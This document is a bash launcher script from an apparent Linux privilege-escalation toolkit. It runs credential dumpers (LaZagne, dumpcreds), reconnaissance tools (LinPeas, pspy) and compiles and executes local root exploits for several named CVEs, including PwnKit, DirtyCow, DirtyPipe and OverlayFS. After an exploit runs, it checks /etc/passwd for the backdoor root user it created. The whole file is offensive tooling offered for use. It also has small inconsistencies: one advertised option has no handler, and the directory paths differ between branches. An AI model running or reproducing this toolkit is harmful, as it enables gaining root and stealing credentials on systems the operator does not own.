#!/bin/bash

# Banniere
ascii() {
     cat <<"EOF"
                                                    
 $$$$$$\            $$\ $$\ $$$$$$$$\           
$$  __$$\           $$ |$$ |$$  _____|          
$$ /  \__|$$\   $$\ $$ |$$ |$$ |      $$\   $$\ 
$$$$\     $$ |  $$ |$$ |$$ |$$$$$\    \$$\ $$  |
$$  _|    $$ |  $$ |$$ |$$ |$$  __|    \$$$$  / 
$$ |      $$ |  $$ |$$ |$$ |$$ |       $$  $$<  
$$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\ 
\__|       \______/ \__|\__|\________|\__/  \__|

               by M0rPH3U53
EOF
}

if [[ "$*" == "-help" ]]; then
     ascii
     echo " "
     echo " "
     echo "Usage: ./fullEx.sh COMMAND"
     echo " "
     echo "Outils:"
     echo "   -LinPeas       Execute LinPeas"
     echo "   -LaZagne       Execute LaZagne"
     echo "   -Pspy64/32     Execute pspy64/32"
     echo "   -DumpCred      Execute DumpCred"
     echo " "
     echo "Exploits:"
     echo "   -Overlays      Compilation + execution binaire - CVE-2021-3493"
     echo "   -DirtyCow      Compilation + execution binaire - CVE-2016-5195"
     echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
     echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
     echo "   -Host          Sudo Host - CVE-2025-32462"
     echo "   -CFail         Copy Fail - CVE-2026-31431"
     echo "   -PKroot        Pack2TheRoot - CVE-2026-41651"
     echo " "
     echo "Cmds:"
     echo "   -check         Verifie si gcc est installer"
     echo "   -perm          Applique les droit d'execution sur '/fullEx'"
     echo "   -help          Affiche les commandes"
     echo " "
     exit 0
fi

# Applique les droit d'execution sur le l'ensemble du dossier fullEx
if [[ "$*" == "-perm" ]]; then
   find ${PWD} -type f -exec chmod +x {} \;
fi

# Verifie si GCC est installer
if [[ "$*" == "-check" ]]; then
     if which gcc >/dev/null 2>&1; then
          echo "[+] GCC found!"
     else
          echo "[-] GCC not found!"
     fi
fi

## Outils ##

# LinPeas
if [[ "$*" == "-LinPeas" ]]; then
   "${PWD}/outils/linpeas/linpeas.sh"
fi

# LaZagne
if [[ "$*" == "-LaZagne" ]]; then
  "${PWD}/outils/LaZagne/Linux/laZagne.py"
fi

# Pspy
for arch in 64 32; do
     if [[ "$*" == "-Pspy${arch}" ]]; then
          "${PWD}/outils/pspy/pspy${arch}"
     fi
done

# DumpCred
if [[ "$*" == "-DumpCred" ]]; then 
     ${PWD}/outils/Dumpcreds/dumpcreds -D
fi

## Exploit ##

# PwnKit
for arch in 64 32; do
     if [[ "$*" == "-PwnKit${arch}" ]]; then
          "${PWD}/exploit/PwnKit/PwnKit${arch}"
     fi
done

# Overlays
if [[ "$*" == "-Overlays" ]]; then
     gcc ${PWD}/exploit/Overlays/overlays.c -o ${PWD}/exploit/Overlays/overlays
     echo "[+] Compilation successfuly !"
     echo "[+] PATH=${PWD}/exploit/Overlays/overlays"
     echo "[+] Executing the binary..."
     ${PWD}/exploit/Overlays/overlays

fi

# DirtyCow
if [[ "$*" == "-DirtyCow" ]]; then
     gcc -pthread ${PWD}/exploits/DirtyCow/dirtycow.c -o ${PWD}/exploits/DirtyCow/dcow -lcrypt
     echo "[+] Compilation successfuly !"
     echo "[+] PATH=${PWD}/exploit/DirtyCow/dcow"
     echo "[+] Executing the binary..."
     ${PWD}/exploits/DirtyCow/dcow test
     echo "[+] User firefart created"
     cat /etc/passwd | grep 'firefart'
fi

# DirtyPipe
if [[ "$*" == "-DirtyPipe" ]]; then
     ${PWD}/exploit/DirtyPipe/dpipe --root
     cat /etc/passwd | grep root
fi

# Sudo-Host
if [[ "$*" == "-Host" ]]; then
     sudo -h dev.test.local -i
fi

# Copy-Fail
if [[ "$*" == "-CFail" ]]; then
     python3 ${PWD}/exploit/CopyFail/cf.py
fi
